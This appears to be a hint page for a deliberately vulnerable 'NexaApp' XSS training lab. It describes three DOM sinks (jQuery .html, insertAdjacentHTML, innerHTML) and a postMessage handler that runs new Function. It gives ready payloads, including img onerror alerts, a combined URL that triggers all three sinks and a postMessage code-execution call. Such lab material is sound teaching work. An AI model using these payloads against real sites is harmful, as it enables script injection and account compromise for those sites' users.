Hint: NexaApp (Final Boss — 3 Modules)

Three separate JS modules, three separate sinks. Find and trigger all three.
1
Module 1: Search (jQuery .html)›
NexaSearch.render has a no-results path that does $("#nx-search-results").html('...' + query + '...'). NexaSearch.init auto-runs a search if ?q= is present. Payload: ?q=zzz<img src=x onerror=alert(1)>
2
Module 2: Profile bio (insertAdjacentHTML)›
NexaProfile.updateBioFromHash reads #bio=... and does bioEl.insertAdjacentHTML("beforeend", '...'+parts.bio+'...'). It also runs on hashchange, so changing the hash at runtime fires it. Payload: #bio=<img src=x onerror=alert(1)>
3
Module 3: Widget via URL›
NexaWidgets.loadFromURL reads ?widget= (base64 or raw JSON), parses, and calls mount. If config.type === "announcement" it does div.innerHTML = config.message. If config.type === "custom" it does insertAdjacentHTML(config.html).
4
Module 3 bonus: postMessage nx:exec›
NexaWidgets.listenMessages handles nx:exec with new Function(e.data.code)(). Any frame/window can send. Payload: 
postMessage({type:'nx:exec', code:'alert("EXEC")'}, '*')

Single URL hitting all 3 URL-based sinks at once:

/labs/xss-hunt/hunt6-multi-module.html?q=zzz<img src=x onerror=alert(1)>&widget=%7B%22type%22%3A%22custom%22%2C%22html%22%3A%22%3Cimg+src%3Dx+onerror%3Dalert(2)%3E%22%7D#bio=<img src=x onerror=alert(3)>

Module 3 via postMessage (run in console):

postMessage({type:'nx:exec', code:'alert("new Function() XSS")'}, '*')
